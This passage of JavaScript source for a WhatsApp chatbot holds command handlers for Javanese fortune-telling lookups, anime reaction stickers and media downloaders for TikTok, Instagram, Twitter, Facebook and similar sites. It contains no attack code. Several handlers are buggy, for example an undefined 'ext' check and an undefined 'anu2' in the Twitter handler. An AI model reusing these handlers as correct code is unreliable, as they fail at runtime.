Dani.sendText(m.chat, `❏ *Nama :* ${anu.message.nama}\n❏ *Lahir :* ${anu.message.tgl_lahir}\n❏ *Life Path :* ${anu.message.life_path}\n❏ *Destiny :* ${anu.message.destiny}\n❏ *Destiny Desire :* ${anu.message.destiny_desire}\n❏ *Personality :* ${anu.message.personality}\n❏ *Persentase :* ${anu.message.persentase_kecocokan}`, freply)
limitAdd(sender, limit)
}
break
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} Dani|Asfi`
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return m.reply(anu.message)
Dani.sendImage(m.chat,  anu.message.gambar, `❏ *Nama Anda :* ${anu.message.nama_anda}\n❏ *Nama Pasangan :* ${anu.message.nama_pasangan}\n❏ *Sisi Positif :* ${anu.message.sisi_positif}\n❏ *Sisi Negatif :* ${anu.message.sisi_negatif}`, freply)
limitAdd(sender, limit)
}
break
case 'jadianpernikahan': case 'jadiannikah': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Tanggal Pernikahan :* ${anu.message.tanggal}\n❏ *karakteristik :* ${anu.message.karakteristik}`, freply)
limitAdd(sender, limit)
}
break
case 'sifatusaha': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Lahir :* ${anu.message.hari_lahir}\n❏ *Usaha :* ${anu.message.usaha}`, freply)
limitAdd(sender, limit)
}
break
case 'rejeki': case 'rezeki': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Lahir :* ${anu.message.hari_lahir}\n❏ *Rezeki :* ${anu.message.rejeki}\n❏ *Catatan :* ${anu.message.catatan}`, freply)
limitAdd(sender, limit)
}
break
case 'pekerjaan': case 'kerja': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Lahir :* ${anu.message.hari_lahir}\n❏ *Pekerjaan :* ${anu.message.pekerjaan}\n❏ *Catatan :* ${anu.message.catatan}`, freply)
limitAdd(sender, limit)
}
break
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Analisa :* ${anu.message.analisa}\n❏ *Angka Akar :* ${anu.message.angka_akar}\n❏ *Sifat :* ${anu.message.sifat}\n❏ *Elemen :* ${anu.message.elemen}\n❏ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, freply)
limitAdd(sender, limit)
}
break
case 'potensipenyakit': case 'penyakit': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Analisa :* ${anu.message.analisa}\n❏ *Sektor :* ${anu.message.sektor}\n❏ *Elemen :* ${anu.message.elemen}\n❏ *Catatan :* ${anu.message.catatan}`, freply)
limitAdd(sender, limit)
}
break
case 'artitarot': case 'tarot': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
Dani.sendImage(m.chat, anu.message.image, `❏ *Lahir :* ${anu.message.tgl_lahir}\n❏ *Simbol Tarot :* ${anu.message.simbol_tarot}\n❏ *Arti :* ${anu.message.arti}\n❏ *Catatan :* ${anu.message.catatan}`, freply)
limitAdd(sender, limit)
}
break
case 'fengshui': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} Dani, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Nama :* ${anu.message.nama}\n❏ *Lahir :* ${anu.message.tahun_lahir}\n❏ *Gender :* ${anu.message.jenis_kelamin}\n❏ *Angka Kua :* ${anu.message.angka_kua}\n❏ *Kelompok :* ${anu.message.kelompok}\n❏ *Karakter :* ${anu.message.karakter}\n❏ *Sektor Baik :* ${anu.message.sektor_baik}\n❏ *Sektor Buruk :* ${anu.message.sektor_buruk}`, freply)
limitAdd(sender, limit)
}
break
case 'haribaik': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Lahir :* ${anu.message.tgl_lahir}\n❏ *Kala Tinantang :* ${anu.message.kala_tinantang}\n❏ *Info :* ${anu.message.info}\n❏ *Catatan :* ${anu.message.catatan}`, freply)
limitAdd(sender, limit)
}
break
case 'harisangar': case 'taliwangke': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Lahir :* ${anu.message.tgl_lahir}\n❏ *Hasil :* ${anu.message.result}\n❏ *Info :* ${anu.message.info}\n❏ *Catatan :* ${anu.message.catatan}`, freply)
limitAdd(sender, limit)
}
break
case 'harinaas': case 'harisial': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Hari Lahir :* ${anu.message.hari_lahir}\n❏ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n❏ *Hari Naas :* ${anu.message.hari_naas}\n❏ *Info :* ${anu.message.catatan}\n❏ *Catatan :* ${anu.message.info}`, freply)
limitAdd(sender, limit)
}
break
case 'nagahari': case 'harinaga': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Hari Lahir :* ${anu.message.hari_lahir}\n❏ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n❏ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n❏ *Catatan :* ${anu.message.catatan}`, freply)
limitAdd(sender, limit)
}
break
case 'arahrejeki': case 'arahrezeki': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Hari Lahir :* ${anu.message.hari_lahir}\n❏ *tanggal Lahir :* ${anu.message.tgl_lahir}\n❏ *Arah Rezeki :* ${anu.message.arah_rejeki}\n❏ *Catatan :* ${anu.message.catatan}`, freply)
limitAdd(sender, limit)
}
break
case 'peruntungan': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} Dani, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Nama :* ${anu.message.nama}\n❏ *Lahir :* ${anu.message.tgl_lahir}\n❏ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n❏ *Hasil :* ${anu.message.result}\n❏ *Catatan :* ${anu.message.catatan}`, freply)
limitAdd(sender, limit)
}
break
case 'weton': case 'wetonjawa': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Tanggal :* ${anu.message.tanggal}\n❏ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n❏ *Watak Hari :* ${anu.message.watak_hari}\n❏ *Naga Hari :* ${anu.message.naga_hari}\n❏ *Jam Baik :* ${anu.message.jam_baik}\n❏ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, freply)
limitAdd(sender, limit)
}
break
case 'sifat': case 'karakter': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} Dani, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Nama :* ${anu.message.nama}\n❏ *Lahir :* ${anu.message.tgl_lahir}\n❏ *Garis Hidup :* ${anu.message.garis_hidup}`, freply)
limitAdd(sender, limit)
}
break
case 'keberuntungan': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} Dani, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Nama :* ${anu.message.nama}\n❏ *Lahir :* ${anu.message.tgl_lahir}\n❏ *Hasil :* ${anu.message.result}`, freply)
limitAdd(sender, limit)
}
break
case 'memancing': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Tanggal :* ${anu.message.tgl_memancing}\n❏ *Hasil :* ${anu.message.result}\n❏ *Catatan :* ${anu.message.catatan}`, freply)
limitAdd(sender, limit)
}
break
case 'masasubur': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Hasil :* ${anu.message.result}\n❏ *Catatan :* ${anu.message.catatan}`, freply)
limitAdd(sender, limit)
}
break
case 'zodiak': case 'zodiac': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix+ command} 7 7 2005`
let zodiak = [
["capricorn", new Date(1970, 0, 1)],
["aquarius", new Date(1970, 0, 20)],
["pisces", new Date(1970, 1, 19)],
["aries", new Date(1970, 2, 21)],
["taurus", new Date(1970, 3, 21)],
["gemini", new Date(1970, 4, 21)],
["cancer", new Date(1970, 5, 22)],
["leo", new Date(1970, 6, 23)],
["virgo", new Date(1970, 7, 23)],
["libra", new Date(1970, 8, 23)],
["scorpio", new Date(1970, 9, 23)],
["sagittarius", new Date(1970, 10, 22)],
["capricorn", new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(text)
if (date == 'Invalid Date') throw date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
let zodiac = await getZodiac(birth[1], birth[2])
let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Zodiak :* ${anu.message.zodiak}\n❏ *Nomor :* ${anu.message.nomor_keberuntungan}\n❏ *Aroma :* ${anu.message.aroma_keberuntungan}\n❏ *Planet :* ${anu.message.planet_yang_mengitari}\n❏ *Bunga :* ${anu.message.bunga_keberuntungan}\n❏ *Warna :* ${anu.message.warna_keberuntungan}\n❏ *Batu :* ${anu.message.batu_keberuntungan}\n❏ *Elemen :* ${anu.message.elemen_keberuntungan}\n❏ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n❏ *Catatan :* ${anu.message.catatan}`, freply)
limitAdd(sender, limit)
}
break
case 'shio': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
let anu = await primbon.shio(text)
if (anu.status == false) return m.reply(anu.message)
Dani.sendText(m.chat, `❏ *Hasil :* ${anu.message}`, freply)
limitAdd(sender, limit)
}
break
case 'cry':case 'kill':case 'hug':case 'pat':case 'lick':case 'kiss':case 'bite':case 'yeet':case 'neko':case 'bully':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'awoo':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'cuddle':case 'highfive':case 'handhold': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!isNsfw) return m.reply(`Nsfw Tidak Aktif`)
sticWait(from)
let anu = await getBuffer(`${webdani}/api/sfw/${command}?apikey=${daniapi}`)
Dani.sendImageAsSticker(m.chat, anu, freply, { packname: global.packname, author: global.author })
limitAdd(sender, limit)
}
break
case 'tiktok': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!q) throw mess.urll                
if (!isUrl(q)) throw mess.urll
if (!text.includes('tiktok.com')) throw mess.falseurl
sticWait(from)
let dani = await fetchJson(`https://api.akuari.my.id/downloader/tiktok3?link=${q}`)
Dani.sendMessage(m.chat, { video: { url: dani.hasil.download_mp4_hd },caption: `With No Watermark` }, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'ttnowm': case 'tiktoknowm': {                
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!q) throw mess.urll                
if (!isUrl(q)) throw mess.urll
if (!text.includes('tiktok.com')) throw mess.falseurl
sticWait(from)
Dani.sendMessage(m.chat, { video: { url: `https://api.akuari.my.id/downloader/tiktoknowm?link=${q}` },caption: `With No Watermark` }, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'ttwm': case 'tiktokwm': {         
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!q) throw mess.urll                
if (!isUrl(q)) throw mess.urll
if (!text.includes('tiktok.com')) throw mess.falseurl
sticWait(from)
Dani.sendMessage(m.chat, { video: { url: `https://api.akuari.my.id/downloader/tiktokwithwm?link=${q}` },caption: `With Watermark` }, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'ttaudio': case 'tiktokaudio': {            
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!q) throw mess.urll                
if (!isUrl(q)) throw mess.urll
if (!text.includes('tiktok.com')) throw mess.falseurl
sticWait(from)
Dani.sendMessage(m.chat, { audio: { url: `https://api.akuari.my.id/downloader/tiktokaudio?link=${q}` }, mimetype: 'audio/mpeg'}, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'cocofun': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!q) throw mess.urll                
if (!isUrl(q)) throw mess.urll
if (!text.includes('icocofun.com')) throw mess.falseurl
sticWait(from)
let anu = await fetchJson(`${webdani}/api/download/cocofun?url=${q}&apikey=${daniapi}`)
let buttons = [
{buttonId: `cocofunwm ${text}`, buttonText: {displayText: 'WITH WM'}, type: 1},
{buttonId: `cocofunnowm ${text}`, buttonText: {displayText: 'WITH NO WM'}, type: 1}
]
let buttonMessage = {
image: { url: anu.result.thumbnail },
caption: `「 *COCOFUN DOWNLOAD* 」\n\n❏ *Topic* : ${anu.result.topic}\n❏ *Caption* : ${anu.result.caption}\n❏ *Play* : ${anu.result.play}\n❏ *Like* : ${anu.result.like}\n❏ *Share* : ${anu.result.share}\n❏ *Duration* : ${anu.result.duration}`,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 5
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'cocofunwm': {                
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!q) throw mess.urll                
if (!isUrl(q)) throw mess.urll
if (!text.includes('icocofun.com')) throw mess.falseurl
sticWait(from)
let anu = await fetchJson(`${webdani}/api/download/cocofun?url=${q}&apikey=${daniapi}`)
Dani.sendMessage(m.chat, { video: { url: anu.result.watermark },caption: `With Watermark` }, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'cocofunnowm': {                
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!q) throw mess.urll                
if (!isUrl(q)) throw mess.urll
if (!text.includes('icocofun.com')) throw mess.falseurl
sticWait(from)
let anu = await fetchJson(`${webdani}/api/download/cocofun?url=${q}&apikey=${daniapi}`)
Dani.sendMessage(m.chat, { video: { url: anu.result.no_watermark },caption: `With No Watermark` }, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'likeedl': {                
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!q) throw mess.urll                
if (!isUrl(q)) throw mess.urll
if (!text.includes('l.likee.video')) throw mess.falseurl
sticWait(from)
let anu = await fetchJson(`${webdani}/api/download/likee?url=${q}&apikey=${daniapi}`)
Dani.sendMessage(m.chat, { video: { url: anu.result.no_watermark },caption: `With No Watermark` }, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'imgurdl': {                
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!q) throw mess.urll                
if (!isUrl(q)) throw mess.urll
if (!text.includes('imgur.com')) throw mess.falseurl
sticWait(from)
let anu = await fetchJson(`${webdani}/api/download/imgur?url=${q}&apikey=${daniapi}`)
Dani.sendMessage(m.chat, { video: { url: anu.result.video_link },caption: `With Video` }, { quoted: freply })
Dani.sendMessage(m.chat, { image: { url: anu.result.image_link },caption: `With Image` }, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'instagram': case 'ig': case 'igdl': {       
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw mess.urll
if (!isUrl(args[0]) && !args[0].includes('instagram.com')) throw mess.falseurl
sticWait(from)
let urlnya = text
hx.igdl(urlnya)
.then(async(result) => {
for(let i of result.medias){
if(i.url.includes('mp4')){
let link = await getBuffer(i.url)
Dani.sendMessage(m.chat, { video: link, }, { quoted: freply })
} else {
let link = await getBuffer(i.url)
Dani.sendMessage(m.chat, { image: link, }, { quoted: freply })                  
limitAdd(sender, limit)
}
}
}).catch((err) => m.reply(`Server eror`))
}		
break
case 'igs': case 'igstory': case 'instagramstory': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw 'Enter Username!'                
sticWait(from)
hx.igstory(text)
.then(async(result) => {
for(let i of result.medias){
if(i.url.includes('mp4')){
let link = await getBuffer(i.url)
Dani.sendMessage(m.chat, { video: link, }, { quoted: freply })
} else {
let link = await getBuffer(i.url)
Dani.sendMessage(m.chat, { image: link, }, { quoted: freply })                  
limitAdd(sender, limit)
}
}
}).catch((err) => m.reply(`Sorry the username was not found`))
}
break            
case 'soundcloud': case 'scdl': {            
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!q) throw mess.urll                
if (!isUrl(q)) throw mess.urll
if (!text.includes('soundcloud.com')) throw mess.falseurl
sticWait(from)
let anu = await fetchJson(`${webdani}/api/download/scdl?url=${q}&apikey=${daniapi}`)
let msg = await Dani.sendImage(m.chat, anu.result.thumb, `「 *SOUNDCLOUD DOWNLOAD* 」\n\n❏ *Title* : ${anu.result.judul}\n❏ *Download Count* : ${anu.result.download_count}\n❏ *Url* : ${text}`)
Dani.sendMessage(m.chat, { audio: { url: anu.result.link }, mimetype: 'audio/mpeg', fileName: anu.result.judul+'.m4a' }, { quoted: msg })
limitAdd(sender, limit)
}
break
case 'twitdl': case 'twitter': {        
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!q) throw mess.urll                
if (!isUrl(q)) throw mess.urll
if (!text.includes('twitter.com')) throw mess.falseurl
sticWait(from)
let anu = await fetchJson(`${webdani}/api/download/twitter3?url=${q}&apikey=${daniapi}`)
Dani.sendMessage(m.chat, { video: { url: anu.result.quality_720 },caption: `❏ *T W I T T E R D O W N L O A D* ❏\n\n❏ *Username* : ${anu2.result.nickname}\n❏ *Caption* : ${anu2.result.caption}\n❏ *Quality* : 720P` }, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'twittermp3': case 'twitteraudio': {      
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!q) throw mess.urll                
if (!isUrl(q)) throw mess.urll
if (!text.includes('twitter.com')) throw mess.falseurl
sticWait(from)
let anu = await fetchJson(`${webdani}/api/download/twitter3?url=${q}&apikey=${daniapi}`)
Dani.sendMessage(m.chat, { audio: { url: anu.result.mp3 }, mimetype: 'audio/mpeg'}, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'fbdl': case 'fb': case 'facebook': {        
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw mess.urll
sticWait(from)
let anu = await fetchJson(`${webdani}/api/download/fbdl?url=${text}&apikey=${daniapi}`)
let buttons = [
{buttonId: `fbsd ${text}`, buttonText: {displayText: 'SD'}, type: 1},
{buttonId: `fbhd ${text}`, buttonText: {displayText: 'HD'}, type: 1}
]
let buttonMessage = {
image: { url: anu.result.thumb },
caption: `「 *FACEBOOK DOWNLOAD* 」\n\n❏ *Author* : ${anu.result.author}\n❏ *Title* : ${anu.result.title}\n❏ *Thumb* : ${anu.result.thumb}\n❏ *Url* : ${text}`,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 5
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'fbsd': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
